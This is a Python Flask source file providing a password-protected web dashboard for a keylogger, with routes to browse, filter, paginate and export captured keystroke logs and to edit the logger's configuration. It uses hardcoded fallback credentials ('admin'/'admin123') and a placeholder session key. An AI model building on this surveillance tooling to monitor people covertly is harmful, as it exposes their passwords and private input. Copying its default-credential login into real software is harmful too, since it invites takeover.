"""Flask web application for keylogger interface."""

import os
import json
import logging
from datetime import datetime, timedelta
from typing import Dict, List, Any, Optional
from flask import Flask, render_template, request, jsonify, redirect, url_for, session, flash
from werkzeug.security import check_password_hash, generate_password_hash
from functools import wraps

logger = logging.getLogger(__name__)


def create_web_app(keylogger_core, config_manager):
    """Create and configure Flask web application."""
    app = Flask(__name__, 
                template_folder='../templates',
                static_folder='../static')
    
    # Configure app
    app.secret_key = config_manager.get('web.secret_key', 'dev-key-change-in-production')
    app.config['DEBUG'] = config_manager.get('web.debug', False)
    
    # Store references
    app.keylogger_core = keylogger_core
    app.config_manager = config_manager
    
    logger.info("Setting up Flask routes...")
    
    def login_required(f):
        """Decorator to require login for protected routes."""
        @wraps(f)
        def decorated_function(*args, **kwargs):
            if not session.get('logged_in'):
                return redirect(url_for('login'))
            return f(*args, **kwargs)
        return decorated_function
    
    @app.route('/login', methods=['GET', 'POST'])
    def login():
        """Login page."""
        if request.method == 'POST':
            username = request.form.get('username')
            password = request.form.get('password')
            
            # Simple authentication (in production, use proper user management)
            admin_user = config_manager.get('web.admin_username', 'admin')
            admin_pass = config_manager.get('web.admin_password', 'admin123')
            
            if username == admin_user and password == admin_pass:
                session['logged_in'] = True
                session['username'] = username
                flash('Successfully logged in!', 'success')
                return redirect(url_for('dashboard'))
            else:
                flash('Invalid credentials!', 'error')
        
        return render_template('login.html')
    
    @app.route('/logout')
    def logout():
        """Logout and clear session."""
        session.clear()
        flash('Successfully logged out!', 'info')
        return redirect(url_for('login'))
    
    @app.route('/')
    @login_required
    def dashboard():
        """Main dashboard."""
        try:
            # Get basic stats
            stats = keylogger_core.get_session_stats()
            recent_activity = _get_recent_activity()
            
            return render_template('dashboard.html', 
                                 stats=stats,
                                 recent_activity=recent_activity)
        except Exception as e:
            logger.error(f"Error loading dashboard: {e}")
            return render_template('error.html', error=str(e))
    
    @app.route('/logs')
    @login_required
    def logs():
        """Logs page."""
        try:
            page = request.args.get('page', 1, type=int)
            per_page = request.args.get('per_page', 50, type=int)
            event_type = request.args.get('type', '')
            
            logs_data = _get_recent_logs(page, per_page, event_type)
            
            return render_template('logs.html', 
                                 logs=logs_data['logs'],
                                 pagination=logs_data['pagination'])
        except Exception as e:
            logger.error(f"Error loading logs: {e}")
            return render_template('error.html', error=str(e))
    
    @app.route('/api/logs')
    @login_required
    def api_logs():
        """API endpoint for logs data."""
        try:
            page = request.args.get('page', 1, type=int)
            per_page = request.args.get('per_page', 50, type=int)
            event_type = request.args.get('type', '')
            
            return jsonify(_get_recent_logs(page, per_page, event_type))
        except Exception as e:
            logger.error(f"Error in logs API: {e}")
            return jsonify({'error': str(e)}), 500
    
    @app.route('/config')
    @login_required
    def config():
        """Configuration page."""
        try:
            current_config = config_manager.get_all_config()
            return render_template('config.html', config=current_config)
        except Exception as e:
            logger.error(f"Error loading config: {e}")
            return render_template('error.html', error=str(e))
    
    @app.route('/api/config', methods=['GET', 'POST'])
    @login_required
    def api_config():
        """API endpoint for configuration."""
        try:
            if request.method == 'POST':
                new_config = request.get_json()
                config_manager.update_config(new_config)
                return jsonify({'success': True, 'message': 'Configuration updated'})
            else:
                return jsonify(config_manager.get_all_config())
        except Exception as e:
            logger.error(f"Error in config API: {e}")
            return jsonify({'error': str(e)}), 500
    
    @app.route('/export')
    @login_required
    def export():
        """Export page."""
        return render_template('export.html')
    
    @app.route('/api/export')
    @login_required
    def api_export():
        """API endpoint for exporting logs."""
        try:
            format_type = request.args.get('format', 'json')
            date_from = request.args.get('from')
            date_to = request.args.get('to')
            
            # Export logic would go here
            return jsonify({
                'success': True,
                'message': f'Export in {format_type} format requested',
                'data': []
            })
        except Exception as e:
            logger.error(f"Error in export API: {e}")
            return jsonify({'error': str(e)}), 500
    
    @app.route('/performance')
    @login_required
    def performance():
        """Performance monitoring page."""
        try:
            perf_stats = _get_performance_stats()
            return render_template('performance.html', stats=perf_stats)
        except Exception as e:
            logger.error(f"Error loading performance: {e}")
            return render_template('error.html', error=str(e))
    
    @app.route('/api/performance')
    @login_required
    def api_performance():
        """API endpoint for performance data."""
        try:
            return jsonify(_get_performance_stats())
        except Exception as e:
            logger.error(f"Error in performance API: {e}")
            return jsonify({'error': str(e)}), 500
    
    @app.route('/test')
    def test_route():
        """Test route to verify web app is working."""
        return jsonify({
            'status': 'ok',
            'message': 'Web application is running',
            'timestamp': datetime.now().isoformat()
        })
    
    @app.errorhandler(404)
    def not_found(error):
        """Handle 404 errors."""
        return render_template('error.html', 
                             error='Page not found',
                             error_code=404), 404
    
    @app.errorhandler(500)
    def internal_error(error):
        """Handle 500 errors."""
        return render_template('error.html', 
                             error='Internal server error',
                             error_code=500), 500
    
    def _get_recent_activity(limit: int = 10) -> List[Dict[str, Any]]:
        """Get recent activity from logging manager."""
        try:
            # Try to get from logging manager buffer first
            if hasattr(keylogger_core, 'logging_manager'):
                buffer_entries = keylogger_core.logging_manager.get_buffer_entries()
                if buffer_entries:
                    # Parse and format buffer entries
                    activities = []
                    for entry in buffer_entries[-limit:]:
                        activities.append({
                            'timestamp': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
                            'type': 'Activity',
                            'message': entry
                        })
                    return activities
            
            # Fallback to mock data
            return [
                {
                    'timestamp': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
                    'type': 'System',
                    'message': 'Keylogger started successfully'
                }
            ]
        except Exception as e:
            logger.error(f"Error getting recent activity: {e}")
            return []
    
    def _get_recent_logs(page: int = 1, per_page: int = 50, event_type: str = '') -> Dict[str, Any]:
        """Get recent logs with pagination."""
        try:
            # Try to get from logging manager buffer first
            if hasattr(keylogger_core, 'logging_manager'):
                buffer_entries = keylogger_core.logging_manager.get_buffer_entries()
                if buffer_entries:
                    # Parse and format buffer entries
                    logs = []
                    for entry in buffer_entries:
                        # Parse log entry format: "timestamp: event_type: message"
                        parts = entry.split(': ', 2)
                        if len(parts) >= 3:
                            timestamp_str = parts[0]
                            event_type_parsed = parts[1]
                            message = parts[2]
                        else:
                            timestamp_str = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
                            event_type_parsed = 'Unknown'
                            message = entry
                        
                        # Filter by event type if specified
                        if event_type and event_type.lower() not in event_type_parsed.lower():
                            continue
                        
                        logs.append({
                            'timestamp': timestamp_str,
                            'type': event_type_parsed,
                            'message': message
                        })
                    
                    # Sort by timestamp (newest first)
                    logs.sort(key=lambda x: x['timestamp'], reverse=True)
                    
                    # Pagination
                    start_idx = (page - 1) * per_page
                    end_idx = start_idx + per_page
                    paginated_logs = logs[start_idx:end_idx]
                    
                    return {
                        'logs': paginated_logs,
                        'pagination': {
                            'page': page,
                            'per_page': per_page,
                            'total': len(logs),
                            'pages': (len(logs) + per_page - 1) // per_page
                        }
                    }
            
            # Try to read from log file if buffer is empty
            try:
                log_file_path = keylogger_core.config.get('logging.file_path', 'logs/keylog.txt')
                if os.path.exists(log_file_path):
                    with open(log_file_path, 'r', encoding='utf-8') as f:
                        lines = f.readlines()
                    
                    logs = []
                    for line in lines[-1000:]:  # Get last 1000 lines
                        line = line.strip()
                        if not line:
                            continue
                        
                        # Parse log line format
                        if ': ' in line:
                            parts = line.split(': ', 2)
                            if len(parts) >= 3:
                                timestamp_str = parts[0]
                                event_type_parsed = parts[1]
                                message = parts[2]
                            else:
                                timestamp_str = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
                                event_type_parsed = 'Log'
                                message = line
                        else:
                            timestamp_str = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
                            event_type_parsed = 'Log'
                            message = line
                        
                        # Filter by event type if specified
                        if event_type and event_type.lower() not in event_type_parsed.lower():
                            continue
                        
                        logs.append({
                            'timestamp': timestamp_str,
                            'type': event_type_parsed,
                            'message': message
                        })
                    
                    # Sort by timestamp (newest first)
                    logs.sort(key=lambda x: x['timestamp'], reverse=True)
                    
                    # Pagination
                    start_idx = (page - 1) * per_page
                    end_idx = start_idx + per_page
                    paginated_logs = logs[start_idx:end_idx]
                    
                    return {
                        'logs': paginated_logs,
                        'pagination': {
                            'page': page,
                            'per_page': per_page,
                            'total': len(logs),
                            'pages': (len(logs) + per_page - 1) // per_page
                        }
                    }
            except Exception as e:
                logger.error(f"Error reading log file: {e}")
            
            # Fallback to empty data
            return {
                'logs': [],
                'pagination': {
                    'page': page,
                    'per_page': per_page,
                    'total': 0,
                    'pages': 0
                }
            }
        except Exception as e:
            logger.error(f"Error getting recent logs: {e}")
            return {
                'logs': [],
                'pagination': {
                    'page': page,
                    'per_page': per_page,
                    'total': 0,
                    'pages': 0
                }
            }
    
    def _get_performance_stats() -> Dict[str, Any]:
        """Get performance statistics."""
        try:
            stats = keylogger_core.get_session_stats()
            
            # Add system performance data
            import psutil
            
            return {
                'session_stats': stats,
                'system': {
                    'cpu_percent': psutil.cpu_percent(),
                    'memory_percent': psutil.virtual_memory().percent,
                    'disk_usage': psutil.disk_usage('/').percent if os.name != 'nt' else psutil.disk_usage('C:').percent
                },
                'keylogger': {
                    'uptime': stats.get('uptime', 0),
                    'events_logged': stats.get('total_events', 0),
                    'errors': stats.get('errors', 0)
                }
            }
        except Exception as e:
            logger.error(f"Error getting performance stats: {e}")
            return {
                'session_stats': {},
                'system': {},
                'keylogger': {}
            }
    
    logger.info(f"Registered login route: {app.url_map}")
    logger.info(f"Web interface initialized on {config_manager.get('web.host', '127.0.0.1')}:{config_manager.get('web.port', 5000)}")
    
    return app